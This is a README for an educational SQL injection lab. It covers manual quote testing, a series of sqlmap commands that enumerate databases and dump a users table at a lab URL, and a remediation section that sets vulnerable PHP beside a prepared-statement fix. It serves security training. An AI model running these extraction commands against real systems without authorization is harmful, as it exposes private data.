# 💉 Task 8: SQL Injection Practical Exploitation

This repository contains documentation and a step-by-step walkthrough for **Task 8: Advanced SQL Injection (SQLi) Exploitation**. This project is designed for educational purposes, focusing on the identification, manual verification, and automated exploitation of SQL injection vulnerabilities in a controlled lab environment.

---

## Project Overview

The primary goal of this task is to demonstrate how an attacker can leverage poorly sanitized input fields to gain unauthorized access to a backend database. By completing this lab, users will understand the lifecycle of an SQLi attack—from initial discovery to full data exfiltration—and learn how to implement effective defensive measures.

## Objectives

* Identify **vulnerable entry points** within a web application.
* Perform **manual testing** to confirm the presence of SQL injection.
* Automate data extraction using **SQLMap**.
* Analyze the **impact** of data breaches on organizational security.
* Develop and document **remediation strategies** (Prepared Statements).

---

## Tools Used

* **Manual Testing:** Browser DevTools, Burp Suite (optional) for request interception.
* **SQLMap:** An open-source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws.
* **Environment:** A dedicated, vulnerable-by-design web application (e.g., DVWA, OWASP Juice Shop).

## Prerequisites

* **Basic SQL Knowledge:** Understanding of `SELECT`, `FROM`, `WHERE`, and `UNION` statements.
* **Web Fundamentals:** Familiarity with HTTP methods (GET/POST) and URL parameters.
* **Environment:** A Linux-based environment (Kali Linux recommended) with SQLMap installed.

---

## Task Overview / Mini Guide

### 1. Identifying Injectable Parameters

Search for input fields or URL parameters that interact with the database.

* **Example:** `http://vulnerable-lab.local/products.php?id=1`
* **Test:** Append a single quote (`'`) to the parameter. If the page returns a database error or behaves unexpectedly, it may be vulnerable.

### 2. Running SQLMap

Once a potential vulnerability is found, use SQLMap to confirm.

```bash
sqlmap -u "http://vulnerable-lab.local/products.php?id=1" --batch

```

### 3. Extracting Database Names

Enumerate all databases accessible to the current DB user.

```bash
sqlmap -u "http://vulnerable-lab.local/products.php?id=1" --dbs

```

### 4. Extracting Tables

Focus on a specific database (e.g., `user_data`) to find sensitive tables.

```bash
sqlmap -u "http://vulnerable-lab.local/products.php?id=1" -D user_data --tables

```

### 5. Extracting User Data

Dump the contents of the target table (e.g., `users`).

```bash
sqlmap -u "http://vulnerable-lab.local/products.php?id=1" -D user_data -T users --dump

```

---

## Attack Flow & Impact Analysis

1. **Reconnaissance:** Mapping the application structure.
2. **Analysis:** Discovering that the `id` parameter is unsanitized.
3. **Exploitation:** Using SQLMap to bypass authentication and dump tables.
4. **Impact:** Unauthorized access to PII (Personally Identifiable Information), potential administrative takeover, and total loss of Data Confidentiality.

---

## Suggested Fixes (Remediation)

To prevent SQLi, developers should never concatenate user input directly into queries.

* **Use Prepared Statements (Parameterized Queries):**
```php
// Vulnerable Code
$query = "SELECT * FROM users WHERE id = " . $_GET['id'];

// Secure Code (PHP PDO)
$stmt = $pdo->prepare('SELECT * FROM users WHERE id = :id');
$stmt->execute(['id' => $_GET['id']]);
$user = $stmt->fetch();

```


* **Input Validation:** Implement strict allow-lists for user input.
* **Principle of Least Privilege:** Ensure the DB user has minimal permissions.

---

## Deliverables

* A comprehensive understanding of **Union-based** and **Error-based** SQLi.
* Documented logs of the exploitation process.
* A verified patch demonstrating successful remediation.

## Final Outcome

Upon completion, learners will possess the practical skills to identify critical web vulnerabilities and provide actionable security recommendations to development teams.


---

